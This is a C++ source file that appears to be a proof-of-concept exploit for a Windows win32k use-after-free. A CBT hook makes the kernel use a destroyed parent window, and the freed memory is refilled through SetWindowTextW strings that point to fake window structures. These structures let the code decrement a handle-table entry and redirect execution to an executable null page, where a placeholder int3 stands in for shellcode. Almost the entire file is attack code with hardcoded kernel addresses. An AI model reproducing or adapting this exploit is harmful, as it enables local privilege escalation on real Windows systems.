#include <afxwin.h>
#include <iostream>

// this should not be in hard, it's the addr of the handle table stored
// in win32k!gSharedInfo
#define BEGIN_HTABLE 0xbc510000

int c = 0;
HWND win;
HWND win2;
HWND win3;
HWND win4;
HWND destroy;

PVOID FakeWin;
PVOID FakeWin2;
wchar_t str[82];

NTSTATUS (NTAPI *NtAllocateVirtualMemory)
(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PULONG AllocationSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

NTSTATUS (NTAPI *NtFreeVirtualMemory)
(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType
);

// The hook needed for set the parent for the window (the one we will destroy
// later)
LRESULT CALLBACK CBT_exploit(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
{
    CBT_CREATEWND *info = (LPCBT_CREATEWND) lParam;

    if (nCode == HCBT_CREATEWND)
    {
        std::cout << "Win parrent : " << std::hex << win2 << std::endl;
        info->hwndInsertAfter = (HWND) win2;
    }

    return 0;
}

// The msg function which does the work for the msg and in there is the destroy
// and the realloc for the use-after-free
LRESULT CALLBACK WndProc (HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (msg == WM_NCCREATE)
    {
        // here we destroy the window we have pass as the parent
        if (!DestroyWindow(win2))
        {
            std::cout << "PROBLEM : not destroy" << std::endl;
            exit(0);
        }
        std::cout << "The window have been destroy" << std::endl;

        // we reallocate the size of the window
        if (!SetWindowTextW(win3, str))
        {
            std::cout << "SetWindowTextW3 fail" << std::endl;
            exit(0);
        }
        // In some case the first allocation with not be at the same
        // position than the window we just destroy so we do it twice
        if (!SetWindowTextW(win4, str))
        {
            std::cout << "SetWindowTextW4 fail" << std::endl;
            exit(0);
        }
        std::cout << "The realloc have being done" << std::endl;
    }
    // just returning the standard stuff for all the message
    return DefWindowProc (hwnd, msg, wParam, lParam);
}

int shellcode()
{
    // I should put a real shellcode here but that will do it for now
    __asm _emit 0xcc // int 3
    return 0;
    // everything after that fail because I don't fix the window...
}

void initShellcode()
{
    PVOID Addr = (PVOID) 0x00001000;
    ULONG Size = 1024;
    ULONG Status;
    char *nulll = 0;
    int  *nu = (int *) 1;

    Status = NtAllocateVirtualMemory( ((HANDLE) -1), &Addr, 0, &Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (Status)
    {
        std::cout << "Allocation of the null page fail" << std::endl;
        exit(0);
    }
    
    nulll[0] = 0xe8; // call
    nu[0] = ((int) shellcode) - 5; // relative addr
    nulll[5] = 0xc3; // ret
}

HINSTANCE init()
{
    HINSTANCE hInst = GetModuleHandle (0);
    WNDCLASSEX wc;

    // we get the address of the NtAllocateVirtualMemory
    *(FARPROC *) &NtAllocateVirtualMemory = GetProcAddress(GetModuleHandle("NTDLL.DLL"),
        "NtAllocateVirtualMemory");
    *(FARPROC *) &NtFreeVirtualMemory = GetProcAddress(GetModuleHandle("NTDLL.DLL"),
        "NtFreeVirtualMemory");

    // we register some window class
    // we need to register for set the WndProc function
    wc.cbSize = sizeof (WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInst;
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH) (COLOR_WINDOW+1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = "MyWinClass";
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

    if (!RegisterClassEx(&wc))
    {
        std::cout << "Window Registration Failed!" << std::endl;
        exit(0);
    }

    initShellcode();

    return hInst;
}

// do the basic operation on the handler for knowing where it is in the table
int get_table_offset_from_handle(int h)
{
    return (0xc * (h & 0xffff));
}

// If I can't allocate normally I just try to free something allocate at a place
// where I can alloc
PVOID desesperateallocate()
{
    int BaseAddr = 0x00200000; // this is arbitrary
    PVOID Addr = (PVOID) BaseAddr;
    ULONG Size = 0;
    ULONG Status;

    Status = NtFreeVirtualMemory( ((HANDLE) -1), &Addr, &Size,
        MEM_RELEASE);

    while (Status)
    {
        BaseAddr += 0x10000;
        Addr = (PVOID) BaseAddr;
        Status = NtFreeVirtualMemory( ((HANDLE) -1), &Addr, &Size,
            MEM_RELEASE);
    }

    std::cout << "Free : 0x" << std::hex << Addr << std::endl;

    Status = NtAllocateVirtualMemory( ((HANDLE) -1), &Addr, 0, &Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (Status)
    {
        std::cout << "Fail reallocation at 0x" << std::hex << BaseAddr
            << std::endl;
        exit(0);
    }
    return Addr;
}

// allocate with NTAllocatVirtualMemory a place for putting a fake window
// In particular this function care that the address will be put in a string
// SetWindowText convert the things it does not now how to print in '?'
PVOID functionallocate()
{
    int BaseAddr = 0x00200000; // this is arbitrary
    PVOID Addr = (PVOID) BaseAddr;
    ULONG Size = 1024;
    ULONG Status = 1;

    Status = NtAllocateVirtualMemory( ((HANDLE) -1), &Addr, 0, &Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    while (Status)
    {
        std::cout << "Error Allocate : 0x" << std::hex << Addr << " "<< Status
            << std::endl;
        BaseAddr += 0x10000;
        Addr = (PVOID) BaseAddr;
        Status = NtAllocateVirtualMemory( ((HANDLE) -1), &Addr, 0, &Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        // If this have not work we will try to free something which is already
        // alloc this have a good chance to finish by crashing the program
        // but for now I have no problem with this
        if (((BaseAddr >> 16) & 0xff) > 0x7f)
        {
            std::cout << "Fail to allocate a valid page" << std::endl;
            std::cout << "Begin desperate allocate" << std::endl;
            return desesperateallocate();
        }
    }

    std::cout << "Success to allocate : 0x" << std::hex << Addr << std::endl;
    return Addr;
}

// allocate with NTAllocatVirtualMemory a place for putting a fake window
PVOID allocatefun()
{
    int BaseAddr = 0x00200000; // this is arbitrary
    PVOID Addr = (PVOID) BaseAddr;
    ULONG Size = 1024;
    ULONG Status = 1;

    Status = NtAllocateVirtualMemory( ((HANDLE) -1), &Addr, 0, &Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    while (Status)
    {
        std::cout << "Error Allocate : 0x" << std::hex << Addr << " "<< Status
            << std::endl;
        BaseAddr += 0x10000;
        Addr = (PVOID) BaseAddr;
        Status = NtAllocateVirtualMemory( ((HANDLE) -1), &Addr, 0, &Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }

    std::cout << "Success to allocate : 0x" << std::hex << Addr << std::endl;
    return Addr;
}


void prepdecr(HINSTANCE hInst)
{
    FakeWin = functionallocate();
    FakeWin = (char *)FakeWin + 0x64; // adding something for not having a double 0

    std::cout << "Fake Win : " << std::hex << FakeWin << std::endl;

    // we put this to 0 because of a check done in the function
    ((int *)FakeWin)[1] = 0;

    // we crate the string for the reallocation
    for (int i = 0; i < 82; i++)
        str[i] = 'a';
    str[81] = '\0';
    // the address for the spwndNext : we put the address of our
    // FakeWindow
    str[0x2c / 2] = (char) (((int) FakeWin) & 0xff);
    str[0x2c / 2 + 1] = (char) (((int) FakeWin >> 16) & 0xff);
}

void changeaddrdecr(int addrdecr)
{
    // we put in the position for the next the addr to decr
    ((int *)FakeWin)[12] = (addrdecr - 4);
}

void decr(HINSTANCE hInst, int addrdecr)
{
    HHOOK hhk;

    // we first create two windows we will use for realloc with SetWindowText
    // this window are name win3 and win4
    win3 = CreateWindowEx(WS_EX_LEFT, "Button", NULL, WS_TILEDWINDOW, 500, 500, 100, 100,
        NULL, NULL, hInst, NULL);
    if (!win3)
    {
        std::cout << "Window 3 not created : " << GetLastError() << std::endl;
        exit (0);
    }

    win4 = CreateWindowEx(WS_EX_LEFT, "Button", NULL, WS_TILEDWINDOW, 500, 500, 100, 100,
        NULL, NULL, hInst, NULL);

    if (!win4)
    {
        std::cout << "Window 4 not created : " << GetLastError() << std::endl;
        exit(0);
    }
    // we need a third window which will set as the parent and then destroy
    // and reallocate using SetWindowText
    win2 = CreateWindowEx(WS_EX_LEFT, "Button", "Test title 2", WS_TILEDWINDOW, 0, 0, 200, 200,
        NULL, NULL, hInst, NULL);
    if (!win2)
    {
        std::cout << "Win2 not created : " << GetLastError() << std::endl;
        exit (0);
    }

    std::cout << "Window parrent : " << win2 << std::endl;
    std::cout << "Window for the realloc : " << win3 << std::endl;
    std::cout << "Window for the realloc : " << win4 << std::endl;

    // we set the hook where we will say that the win2 is the parrent
    hhk = SetWindowsHookEx(5, CBT_exploit, NULL, GetCurrentThreadId());

    // we create the window, all the exploit is during creation
    win = CreateWindowEx(WS_EX_LEFT, "MyWinClass", "Test title", WS_TILEDWINDOW, 0, 0, 200, 200,
        NULL, NULL, hInst, NULL);

    // we check that everything as been going fine
    if (!win)
    {
        std::cout << "An error occur during the creation and the exploit : "
            << GetLastError() << std::endl;
        exit (0);
    }

    // we unset the hook for the next creation
    UnhookWindowsHookEx(hhk);

    // we put the addr to decrement to 0 because if we relink
    // the value we went to decrement could change
    changeaddrdecr(0);
}

void callnull(HINSTANCE hInst, int addrdecr)
{
    HHOOK hhk;
    HWND tmp1;
    HWND tmp2;

    // here we will need two fake windows, the second is the one we will
    // be decrement and will be use to call null
    FakeWin = functionallocate();
    FakeWin2 = allocatefun();
    FakeWin = (char *)FakeWin + 0x64; // adding something for not having a double 0

    std::cout << "Fake Win : " << std::hex << FakeWin << std::endl;
    std::cout << "Fake Win 2 : " << std::hex << FakeWin2 << std::endl;

    ((int *)FakeWin)[1] = 0;

    // we put the addr to decrement as our second false window
    ((int *)FakeWin)[12] = (int)FakeWin2;

    // we set the handler for our fake window as the one we have modify
    ((int *) FakeWin2)[0] =  (int) destroy;
    // we set the clock obj to 1, as it will be set to 0 it will call the
    // destroying function for the type associate and so call the null page
    ((int *) FakeWin2)[1] =  1;

    // we create the string for the reallocation
    for (int i = 0; i < 82; i++)
        str[i] = 'a';
    str[81] = '\0';
    // the address for the spwndNext
    str[0x2c / 2] = (char) (((int) FakeWin) & 0xff);
    str[0x2c / 2 + 1] = (char) (((int) FakeWin >> 16) & 0xff);

    tmp1 = win3;
    // like previously we creatte two window for reallocate
    win3 = CreateWindowEx(WS_EX_LEFT, "Button", NULL, WS_TILEDWINDOW, 500, 500, 100, 100,
        NULL, NULL, hInst, NULL);

    if (!win3)
    {
        std::cout << "Win3 not created : " << GetLastError() << std::endl;
        exit (0);
    }

    tmp2 = win4;
    win4 = CreateWindowEx(WS_EX_LEFT, "Button", NULL, WS_TILEDWINDOW, 500, 500, 100, 100,
        NULL, NULL, hInst, NULL);

    if (!win4)
    {
        std::cout << "Win4 not created : " << GetLastError() << std::endl;
        exit (0);
    }

    // and one wich will be the parrent and then destroy
    win2 = CreateWindowEx(WS_EX_LEFT, "Button", "Test title 2", WS_TILEDWINDOW, 0, 0, 200, 200,
        NULL, NULL, hInst, NULL);

    if (!win2)
    {
        // Funny thing if I exit here the destruction of the window potentially
        // call the null page
        std::cout << "Win2 not created : " << GetLastError() << std::endl;
        exit(0);
    }

    std::cout << "Window 2 : " << win2 << std::endl;
    std::cout << "Window 3 : " << win3 << std::endl;
    std::cout << "Window 4 : " << win4 << std::endl;

    // and finnaly we do the exploit
    hhk = SetWindowsHookEx(5, CBT_exploit, NULL, GetCurrentThreadId());


    win = CreateWindowEx(WS_EX_LEFT, "MyWinClass", "Test title", WS_TILEDWINDOW, 0, 0, 200, 200,
        NULL, NULL, hInst, NULL);

    if (!win)
    {
        std::cout << "Error during the call to the null page : " << GetLastError() << std::endl;
        exit (0);
    }

    UnhookWindowsHookEx(hhk);

}


void cve ()
{
    int addrdecr;

    HINSTANCE hInst;
    PVOID FakeWin;

    hInst = init();

    // the window to destroy
    destroy = CreateWindowEx(WS_EX_LEFT, "Button", NULL, WS_TILEDWINDOW, 500, 500, 100, 100,
        NULL, NULL, hInst, NULL);
    std::cout << "Destroy Window : " << destroy << std::endl;
    std::cout << "Offset table : " << get_table_offset_from_handle((int) destroy) << std::endl;
    addrdecr = BEGIN_HTABLE + get_table_offset_from_handle((int) destroy) + 9;

    prepdecr(hInst);

    std::cout << "Begin the three decrement for the flag" << std::endl;

    changeaddrdecr(addrdecr);
    decr(hInst, addrdecr);
    // we set the addr each time
    changeaddrdecr(addrdecr);
    decr(hInst, addrdecr);

    changeaddrdecr(addrdecr);
    decr(hInst, addrdecr);

    std::cout << "Begin the decrement of the type" << std::endl;

    // we change the decrement for setting the type of the window
    addrdecr--;
    // not sure if it's really useful
    prepdecr(hInst);

    changeaddrdecr(addrdecr);
    decr(hInst, addrdecr);

    std::cout << "Last decrementation done" << std::endl;

    // here the window to decr as the good value we need just now to delete it
    // via the call to link window
    std::cout << "Before : Triger the deletion of the free type" << std::endl;

    callnull(hInst, addrdecr);

    std::cout << "End" << std::endl;
}

int main()
{
    cve();
}
